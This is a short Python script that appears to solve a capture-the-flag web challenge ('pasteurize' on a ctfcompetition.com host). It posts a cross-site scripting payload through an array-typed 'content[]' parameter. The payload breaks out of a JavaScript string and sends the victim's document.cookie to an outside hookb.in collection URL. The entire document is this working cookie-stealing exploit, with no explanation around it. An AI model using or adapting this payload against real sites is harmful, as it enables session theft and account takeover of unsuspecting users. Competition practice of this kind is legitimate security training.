
import requests 

url = 'https://pasteurize.web.ctfcompetition.com/'

r = requests.post(url, data = {
				"content[]": ";new Image().src='https://hookb.in/2qwVgDkLLjt9BBKGplgQ?c='+document.cookie//"
				})

print(r.text)